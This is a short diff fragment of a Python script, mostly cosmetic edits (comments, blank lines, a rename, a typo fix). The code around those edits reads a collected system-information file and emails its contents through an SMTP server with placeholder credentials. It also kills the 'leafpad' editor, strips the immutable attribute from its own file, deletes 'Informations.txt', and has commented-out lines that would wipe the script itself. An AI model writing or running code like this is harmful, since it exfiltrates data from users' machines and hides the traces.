@@ -161,23 +161,34 @@ else:
     try:
         pwd = os.path.abspath(os.getcwd())
         os.system("cd " + pwd)
+        # os.system("pkill " + os.path.basename(__file__))
         os.system('pkill leafpad')
+
         os.system("chattr -i " + os.path.basename(__file__))
+
         print('File was closed.')
         # os.system("rm -rf " + os.path.basename(__file__))
+
     except OSError:
-        print('File is close.')
+        print('File is closed.')
+        # pass
 
     f.close()
-    with open(system_information) as f:
+    with open(sys_info) as f:
         lines = f.read()
+        #
+        # print(str(lines))
+    # message += str(lines)
 
     print(str(lines))
     message += str(lines)
+    # print(message)
 
     with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
         server.login(YOUR_USERNAME, YOUR_PASSWORD)
         server.sendmail(sender, receiver, message)
+
+# os.system("rm -rf " + os.path.basename(__file__))
 
     # os.system("./" + os.path.basename(_file_))
 os.remove("Informations.txt")
